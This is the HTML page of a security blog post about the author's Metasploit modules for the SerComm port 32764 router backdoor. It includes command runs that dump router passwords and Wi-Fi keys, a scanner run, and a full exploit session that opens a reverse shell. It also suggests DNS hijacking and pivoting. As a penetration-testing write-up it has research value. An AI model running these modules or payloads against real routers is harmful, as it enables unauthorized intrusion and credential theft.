@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
+		<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
+		<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
+		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+		<meta content='blogger' name='generator'/>
+		<link href='https://www.mattandreko.com/favicon.ico' rel='icon' type='image/x-icon'/>
+		<link href='https://www.mattandreko.com/' rel='canonical'/>
+		
+		
+		<title>Backdoor Modules for Netgear, Linksys, and Other Routers</title>
+		<meta content='YOUR DESCRIPTION HERE' name='description'/>
+		<meta content='YOUR KEYWORDS HERE' name='keywords'/>
+		<meta content='Facebook App ID here' property='fb:app_id'/>
+		<meta content='Facebook Admin ID here' property='fb:admins'/>
+		<meta content='@username' name='twitter:site'/>
+		<meta content='@username' name='twitter:creator'/>
+		<link type="text/css" rel="stylesheet" href="/css/main.css" />
+		<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'></script>
+		
+		<script type="text/javascript">
+			var _gaq=[['_setAccount','UA-25280110-1'],['_trackPageview']];
+			(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+			g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+			s.parentNode.insertBefore(g,s)}(document,'script'));
+		</script>
+		
+	</head>
+	<body class='index'>
+	
+	<div class='head-wrap'>
+		<div class='row' id='header-wrappers'>
+			<div class='headerleft'>
+				<div class='headerleft section' id='headerleft'>
+					<div class='widget Header' data-version='1' id='Header1'>
+						<div id='header-inner'>
+							<a href='/' style='display: block'><h1 style='display:none'></h1>
+								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.png" style="display: block" width="311px; ">
+							</a>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div style='clear: both;'></div>
+		</div>
+	</div>
+	<div class='navi-menu'>
+		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
+			<div class='widget LinkList' data-version='1' id='LinkList100'>
+				<div class='widget-content'>
+					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
+						<li itemprop='name'><a href='https://www.mattandreko.com/' itemprop='url'>Home</a></li>
+						<li itemprop='name'><a href='https://www.mattandreko.com//categories' itemprop='url'>Categories</a></li>
+						<li itemprop='name'><a href='#' itemprop='url'>Archive</a></li>
+						<li itemprop='name'><a href='#' itemprop='url'>Resume</a></li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
+			<div class='widget LinkList' data-version='1' id='LinkList230'>
+				<div class='widget-content'>
+					<ul id='social'>
+						
+							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'></a></li>
+						
+						
+							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'></a></li>
+						
+						
+							<li><a class='gplus' href='https://plus.google.com/mandreko' title='gplus'></a></li>
+						
+						
+							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'></a></li>
+						
+						
+							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'></a></li>
+						
+						
+							<li><a class='github' href='https://www.github.com/mandreko' title='github'></a></li>
+						
+						
+							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'></a></li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+		<div style='clear: both;'></div>
+	</div>
+	
+
+<div id="main">
+  <div id="content">
+    <div>
+      <article class="hentry" role="article">
+
+        
+        
+
+        <div class="entry-content">
+          
+          
+          
+          
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/backdoor_all_the_routers.jpg#left" />
+    
+    
+</figure>
+
+
+<p>A week or so ago, I read the news of a new backdoor on several devices, including those made by <a href="http://www.belkin.com/">Belkin</a>, <a href="http://www.cisco.com/">Cisco</a>, <a href="http://www.netgear.com">NetGear</a>, <a href="http://www.linksys.com">Linksys</a>, and several others. A list of what seems to be affected devices can be found <a href="http://wikidevi.com/w/index.php?title=Special%3AAsk&amp;q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&amp;po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&amp;eq=yes&amp;p%5Bformat%5D=broadtable&amp;sort_num=&amp;order_num=ASC&amp;p%5Blimit%5D=500&amp;p%5Boffset%5D=&amp;p%5Blink%5D=all&amp;p%5Bsort%5D=&amp;p%5Bheaders%5D=show&amp;p%5Bmainlabel%5D=&amp;p%5Bintro%5D=&amp;p%5Boutro%5D=&amp;p%5Bsearchlabel%5D=%25E">here</a>. <a href="https://twitter.com/elvanderb">Eloi Vanderbeken</a>, who posted his findings on <a href="https://github.com/elvanderb/TCP-32764">GitHub</a> made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted <a href="http://www.metasploit.com">Metasploit</a> integration.</p>
+
+<!-- more -->
+
+<p>After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I&rsquo;m doing penetration tests for large enterprises, I&rsquo;m still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That&rsquo;s where all my learning started.</p>
+
+<div style="clear:both;"></div>
+
+<h2 id="configuration-dump-module">Configuration Dump Module</h2>
+
+<p>So the first module I wrote, with the help of <a href="https://twitter.com/_juan_vazquez_">juan-</a>, was to dump the configuration of the device&rsquo;s nvram. This is useful to an attacker for a couple reasons:</p>
+
+<ol>
+<li>It contains clear-text passwords to the device, which can often be used to login to the remote management console.</li>
+<li>In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.</li>
+<li>It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.</li>
+<li>Did I mention the passwords?</li>
+</ol>
+
+<p>Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:</p>
+
+<pre><code>➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
+[*] Initializing modules...
+RHOST =&gt; 192.168.1.1
+[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
+[+] 192.168.1.1:32764 - Big Endian device found...
+[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
+[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
+[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
+[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
+[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
+[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
+[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
+[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
+[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
+[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a <a href="https://github.com/rapid7/metasploit-framework/pull/2878">pull-request</a> to fix it (in case anyone wants to try it before it&rsquo;s merged to trunk). The above output was using the newer code.</p>
+
+<h2 id="the-scanner-module">The Scanner Module</h2>
+
+<p>So we can dump the nvram configuration of a device. But what good is that if you&rsquo;re unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I&rsquo;m told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.</p>
+
+<pre><code>➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
+[*] Initializing modules...
+RHOSTS =&gt; 192.168.1.0/24
+THREADS =&gt; 64
+[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
+[*] Scanned 036 of 256 hosts (014% complete)
+[*] Scanned 058 of 256 hosts (022% complete)
+[*] Scanned 083 of 256 hosts (032% complete)
+[*] Scanned 105 of 256 hosts (041% complete)
+[*] Scanned 129 of 256 hosts (050% complete)
+[*] Scanned 157 of 256 hosts (061% complete)
+[*] Scanned 196 of 256 hosts (076% complete)
+[*] Scanned 205 of 256 hosts (080% complete)
+[*] Scanned 233 of 256 hosts (091% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<h2 id="the-journey-to-an-exploit">The journey to an exploit</h2>
+
+<p>So the first two modules really didn&rsquo;t take a long time to write. The scanner for example, was all of 30 minutes, since <a href="http://www.metasploit.com">Metasploit</a> has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey&hellip;</p>
+
+<p>Initially, I tried using the payloads in Metasploit, since they&rsquo;ve recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the <a href="http://buildroot.uclibc.org/">uclibc Buildroot</a> toolchain, and found that it&rsquo;s documentation was a bit hard to decipher for a newbie like me. I tried using <a href="http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/">Sourcery Codebench</a>, but again was foiled, because I couldn&rsquo;t target the correct MIPS processors. Eventually I was reading about using <a href="http://www.gentoo.org">Gentoo</a> with its &ldquo;crossdev&rdquo; package.</p>
+
+<p>After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:</p>
+
+<pre><code># emerge crossdev
+# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
+</code></pre>
+
+<p>Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.</p>
+
+<p>I started talking with <a href="https://twitter.com/_juan_vazquez_">juan-</a>, and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran &lsquo;msfpayload&rsquo;, and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a <a href="https://github.com/rapid7/metasploit-framework/pull/2849/files">pull-request</a>. It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything.</p>
+
+<p>After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a <a href="http://www.gentoo.org">Gentoo</a> crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn&rsquo;t really wasted, as I did learn a <em>lot</em> about MIPS, since I was starting to read on shellcoding too.</p>
+
+<h1 id="the-smell-of-fresh-shells-in-the-morning">The smell of fresh shells in the morning</h1>
+
+<p>So after all that time messing with MIPS and <a href="http://www.metasploit.com">Metasploit</a> ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with <a href="https://twitter.com/_juan_vazquez_">juan-</a>, and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.</p>
+
+<p>During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can&rsquo;t explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed <a href="https://github.com/rapid7/metasploit-framework/pull/2874">here</a>.</p>
+
+<p>To demonstrate this bug, I have exploited a NetGear WAP4410N device:</p>
+
+<pre><code>➜  ~  msfconsole -r wap4410n.rc
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
++ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
++ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
++ -- --=[ Answer Q's about Metasploit and win a WiFi Pineapple Mk5   ]
++ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]
+
+[*] Processing wap4410n.rc for ERB directives.
+resource (wap4410n.rc)&gt; use exploit/linux/misc/sercomm_exec
+resource (wap4410n.rc)&gt; set target 2
+target =&gt; 2
+resource (wap4410n.rc)&gt; set payload linux/mipsbe/shell_reverse_tcp
+payload =&gt; linux/mipsbe/shell_reverse_tcp
+resource (wap4410n.rc)&gt; set rhost 192.168.1.1
+rhost =&gt; 192.168.1.1
+resource (wap4410n.rc)&gt; set lhost 192.168.1.136
+lhost =&gt; 192.168.1.136
+msf exploit(sercomm_exec) &gt; show options
+
+Module options (exploit/linux/misc/sercomm_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.1.1      yes       The target address
+   RPORT  32764            yes       The target port
+
+
+Payload options (linux/mipsbe/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.136    yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Cisco WAP4410N
+
+
+msf exploit(sercomm_exec) &gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Generic Linux MIPS Big Endian
+   1   Generic Linux MIPS Little Endian
+   2   Cisco WAP4410N
+   3   Honeywell WAP-PL2 IP Camera
+   4   Netgear DG834
+   5   Netgear DG834G
+   6   Netgear DG834PN
+   7   Netgear DGN1000
+   8   Netgear DSG835
+   9   Netgear WPNT834
+
+
+msf exploit(sercomm_exec) &gt; exploit
+
+[*] Started reverse handler on 192.168.1.136:4444
+[*] Command shell session 1 opened (192.168.1.136:4444 -&gt; 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
+[*] Command Stager progress - 100.00% done (1415/1415 bytes)
+
+ls -al /
+drwxrwxrwx    8 0        0               0 var
+drwxr-xr-x    7 0        0              81 usr
+drwxrwxrwx    4 0        0               0 tmp
+drwxr-xr-x    2 0        0             217 sbin
+drwxr-xr-x    2 0        0              36 root
+dr-xr-xr-x   47 0        0               0 proc
+drwxr-xr-x    2 0        0              23 lost+found
+drwxr-xr-x    3 0        0             742 lib
+drwxr-xr-x    6 0        0             352 etc
+drwxr-xr-x    3 0        0             403 dev
+drwxr-xr-x    2 0        0             323 bin
+drwxr-xr-x   13 0        0             119 ..
+drwxr-xr-x   13 0        0             119 .
+</code></pre>
+
+<p>At this point, command injection has been turned into a fully-fledged shell. As <a href="https://twitter.com/egyp7">egyp7</a> says, &ldquo;I love shells&rdquo;.</p>
+
+<h2 id="the-scary-part">The scary part</h2>
+
+<p>So here you&rsquo;ve seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right?</p>
+
+<p>Another attack could be to simply change the router&rsquo;s DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials.</p>
+
+<p>You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn&rsquo;t belong in the enterprise, and finally have something to back it up with, other than, &ldquo;it says &lsquo;Home&rsquo; on the box&hellip;&rdquo;</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.</p>
+
+<p>In the near future, it sounds like there are going to be staged payloads for MIPS, so you don&rsquo;t have to run the big un-staged ones. As more and more vulnerabilities start popping up on these &ldquo;unconventional computers&rdquo;, we&rsquo;ll see more and more framework around exploiting them. I for one am excited.</p>
+
+<p>Additionally, if you have any access to a vulnerable device, which isn&rsquo;t currently a target in the exploit module, hit me up. I&rsquo;d love to get more devices added, without buying 100 routers.</p>
+
+<p>Lastly, I&rsquo;d like to personally thank <a href="https://twitter.com/_juan_vazquez_">juan-</a>. Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.</p>
+
+        </div>
+        
+      </article>
+    </div>
+    
+  </div>
+</div>
+
+		
+		<div id='w2t_footer'>
+			<div class='w2t-copy-container row'>
+				<div class='w2t_footer_copyright'>
+					Copyright &copy;
+					<script type='text/javascript'>
+						var creditsyear = new Date();
+						document.write(creditsyear.getFullYear());
+					</script>
+					Matt Andreko. All Rights Reserved
+				</div>
+			</div>
+		</div>
+		
+		
+			
+				<script type="text/javascript">
+	var disqus_shortname = 'mattandreko';
+	var disqus_script = 'count.js';
+
+	(function () {
+		var dsq = document.createElement('script'); 
+		dsq.type = 'text/javascript'; 
+		dsq.async = true;
+		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	}());
+</script>
+			
+		
+	</body>
+</html>
